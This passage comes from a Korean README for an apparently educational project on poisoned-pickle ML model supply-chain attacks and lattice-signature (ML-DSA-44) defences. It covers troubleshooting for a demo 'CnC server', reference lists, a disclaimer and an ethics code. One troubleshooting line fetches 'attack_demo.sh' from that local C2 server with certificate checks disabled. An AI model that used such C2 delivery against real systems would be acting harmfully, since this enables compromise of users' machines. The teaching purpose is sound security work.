# 옵션 1: -k 플래그 사용 (권장, 교육용)
curl -k https://localhost:8888/attack_demo.sh

# 옵션 2: 인증서를 시스템에 추가 (프로덕션)
sudo cp server.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

### CnC 서버가 시작되지 않음

**증상**:
```
OSError: [Errno 98] Address already in use
```

**원인**: 포트 8888이 이미 사용 중

**해결**:
```bash
# 포트 사용 확인
sudo netstat -tlnp | grep 8888
# tcp  0  0  0.0.0.0:8888  0.0.0.0:*  LISTEN  12345/python3

# 프로세스 종료
kill 12345

# 또는 다른 포트 사용 (0_server.py 수정)
PORT = 9999
```

### 메모리 부족

**증상**:
```
MemoryError: Unable to allocate array
```

**원인**: 대형 모델 로딩 시 RAM 부족

**해결**:
- 스왑 메모리 활성화
- 더 작은 모델 사용
- 시스템 RAM 증가

---

## 참고 자료

### 표준 문서

1. **NIST FIPS 204: Module-Lattice-Based Digital Signature Standard**
   - URL: https://csrc.nist.gov/pubs/fips/204/final
   - 발행: 2024년 8월
   - 내용: ML-DSA 알고리즘 상세, 파라미터, 보안 증명

2. **NIST FIPS 180-4: Secure Hash Standard (SHS)**
   - URL: https://csrc.nist.gov/pubs/fips/180-4/upd1/final
   - 내용: SHA-256 명세

3. **Python Pickle Protocol**
   - URL: https://docs.python.org/3/library/pickle.html
   - 내용: Pickle 형식, Opcode, 보안 경고

### PyTorch 문서

1. **PyTorch Serialization**
   - URL: https://pytorch.org/docs/stable/notes/serialization.html
   - 내용: 모델 저장/로드, `weights_only` 파라미터

2. **PyTorch Security**
   - URL: https://pytorch.org/docs/stable/notes/security.html
   - 내용: 보안 권장사항, Pickle 위험성

### 학술 논문

1. **Ducas, L., et al. (2018): CRYSTALS-Dilithium: A Lattice-Based Digital Signature Scheme**
   - NIST PQC 제출 논문
   - ML-DSA의 원형 알고리즘

2. **Lyubashevsky, V. (2012): Lattice Signatures without Trapdoors**
   - Fiat-Shamir 기반 격자 서명 최초 제안

3. **Regev, O. (2005): On lattices, learning with errors, random linear codes, and cryptography**
   - LWE 문제 정의 및 암호학적 응용

4. **Nelson, B., et al. (2008): Exploiting Machine Learning to Subvert Your Spam Filter**
   - ML 시스템 공격의 초기 연구

5. **Gu, T., et al. (2017): BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain**
   - 모델 공급망 공격

### 보안 리소스

1. **OWASP Machine Learning Security Top 10**
   - URL: https://owasp.org/www-project-machine-learning-security-top-10/
   - 내용: ML 시스템의 10대 보안 위협

2. **Adversarial ML Reading List**
   - URL: https://github.com/yenchenlin/awesome-adversarial-machine-learning
   - 내용: 적대적 ML 연구 논문 모음

3. **HiddenLayer AI Security**
   - URL: https://hiddenlayer.com/research/
   - 내용: AI/ML 보안 연구 및 사례

### 구현 참고

1. **PQClean**
   - URL: https://github.com/PQClean/PQClean
   - 내용: ML-DSA-44 C 구현 (본 프로젝트 기반)

2. **liboqs - Open Quantum Safe**
   - URL: https://github.com/open-quantum-safe/liboqs
   - 내용: 포스트 양자 암호 라이브러리

3. **Python ctypes Documentation**
   - URL: https://docs.python.org/3/library/ctypes.html
   - 내용: ctypes API, 예제

### 추가 읽기

1. **Micciancio, D., & Regev, O. (2009): Lattice-based Cryptography**
   - 격자 암호학 서베이

2. **Peikert, C. (2016): A Decade of Lattice Cryptography**
   - 격자 암호 10년 발전사

3. **Goodfellow, I., et al. (2014): Explaining and Harnessing Adversarial Examples**
   - 적대적 예제 이론

---

## 라이선스 및 면책

### 라이선스

본 프로젝트는 교육 및 연구 목적으로 제공됩니다.

- 코드: MIT License
- ML-DSA-44 구현: Public Domain (CC0), PQClean 기반
- 문서: CC BY-SA 4.0

### 면책 조항

본 프로젝트는 교육 목적으로만 제공됩니다. 실제 공격에 사용하거나, 허가 없이 타인의 시스템을 테스트하는 것은 불법입니다. 사용자의 행위에 대한 모든 법적 책임은 사용자에게 있습니다.

제공된 코드는 "있는 그대로(AS IS)" 제공되며, 명시적이거나 묵시적인 어떠한 보증도 하지 않습니다.

### 윤리 강령

본 프로젝트를 사용하는 모든 사용자는 다음을 준수해야 합니다:

1. 허가된 환경에서만 실행
2. 교육 및 연구 목적으로만 사용
3. 악의적 목적으로 사용 금지
4. 발견된 취약점을 책임감 있게 공개
5. 법률 및 윤리 규범 준수

---

## 기여 및 연락처

### 기여 방법

본 프로젝트는 교육용 오픈소스 프로젝트입니다. 기여를 환영합니다:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

### 문의

질문, 제안, 버그 리포트는 GitHub Issues를 통해 문의해주세요.

---

**Happy Learning!**

**보안은 모두의 책임입니다. 안전한 AI/ML 시스템을 만들어갑시다.**
